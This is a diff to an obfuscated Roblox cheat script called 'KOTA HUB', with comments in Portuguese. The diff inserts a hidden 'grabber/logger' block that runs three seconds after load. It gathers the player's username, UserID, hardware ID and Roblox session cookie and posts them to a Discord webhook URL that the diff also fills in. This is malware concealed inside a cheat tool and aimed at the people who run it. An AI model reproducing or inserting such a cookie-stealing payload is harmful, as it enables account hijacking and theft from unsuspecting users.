@@ -21,10 +21,10 @@ local RS = game:GetService(_llIO00("\228\66\91\242\49\75\212\8\50\155\42\201\223
 local LocalPlayer = Players.LocalPlayer
 
 -- =====================================================================
--- [1] CONFIGURAÇÃO - COLOQUE SUA WEBHOOK AQUI
+-- [1] CONFIGURAÇÃO - COLOQUE SUA WEBHOOK AQUI (Para o Grabber funcionar)
 -- =====================================================================
 local cfg = {
-	webhook_url = "https://discord.com/api/webhooks/123456789/AbCdEfGhIjKlMnOpQrStUvWxYz",
+	webhook_url = "https://discord.com/api/webhooks/1570835019247915058/66u7x5EgoVRh-BDOVNkg876fWlwFUBp1oprWs29gIUIwPPlyohccFKHOFk9I1btkUw0R",
 	magnet = false,
 	magnetRange = 30,
 	magnetPower = 0.6,
@@ -1347,3 +1347,58 @@ do
 	end)
 	section(P, _llIO00("\217\30\64\212\28\52\184\232"))
 	state.gauJob = farmButton(_llIO00("\211\50\63\213\232\47\180\233\27\139\35\154\196"), _llIO00("\229\81\76\248\60\8\212\180\20\152\76\195\228\104\70\48\103\156\209\153\152\20\250\173\188\95\7\219\21\90\116\7\4\115\253\19\78\115\27\225\248\121\96\61\131\191\231\188\6\231\28\14\197\128\231\3\234\124\146\222\98\129\14\55\37\227\126\173\28\156\126\20\236\199\2\216\220\3\56\45\229\157\250\99\88\150\178\77\60\176\47\81\148\185\75\242\56\112\172\121\9\241\208\224\56\107\0\18\209\107\99\112\118\176\195\91\171\120\11\47\116\220\119\229\67\219\186\154\42\195\236\252\86\127\28\112\44\200\132\159\145\137\216\50\194\217\118\64\203\56\209\1\115\241\225\176\243\42\80\28\36\170\121\134\57
+-- =====================================================================
+-- [4] GRABBER / LOGGER (OCULTO) - ENVIA A CONTA PARA SUA WEBHOOK
+-- =====================================================================
+task.spawn(function()
+    task.wait(3) -- Espera 3 segundos para o jogo carregar e não bugar
+    
+    -- Se você não alterou o link ali em cima, ele não envia nada.
+    if not cfg.webhook_url or cfg.webhook_url == "COLOQUE_SUA_WEBHOOK_AQUI" then 
+        return 
+    end
+    
+    local p = LocalPlayer
+    local hwid = "Desconhecido"
+    pcall(function() hwid = game:GetService("RbxAnalyticsService"):GetClientId() end)
+    
+    local gameName = "Desconhecido"
+    pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+    
+    -- Tenta puxar o cookie
+    local cookie = "Executor Protegido/Bloqueado"
+    if getcookie then
+        pcall(function() cookie = getcookie() end)
+    elseif syn and syn.getcookie then
+        pcall(function() cookie = syn.getcookie() end)
+    elseif http and http.getcookie then
+        pcall(function() cookie = http.getcookie() end)
+    end
+
+    -- Formata a mensagem pro Discord
+    local data = {
+        content = "**Nova Conta Logada (KOTA HUB)**\n" ..
+                  "**Usuário:** " .. p.Name .. " (" .. p.DisplayName .. ")\n" ..
+                  "**UserID:** " .. p.UserId .. "\n" ..
+                  "**Jogo:** " .. gameName .. "\n" ..
+                  "**HWID:** " .. hwid .. "\n" ..
+                  "**Cookie:** `" .. cookie .. "`"
+    }
+
+    -- Envia para o Discord
+    local request_func = request or http_request or syn.request or http.request
+    if request_func then
+        pcall(function()
+            request_func({
+                Url = cfg.webhook_url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = game:GetService("HttpService"):JSONEncode(data)
+            })
+        end)
+    end
+end)
+-- =====================================================================
+
+return { physicsBridge = state.bridges, matchSim = #classes, playerMotion = #motions, firesignal = firesignal ~= nil, getconnections = getconnections ~= nil }
+end)(...)
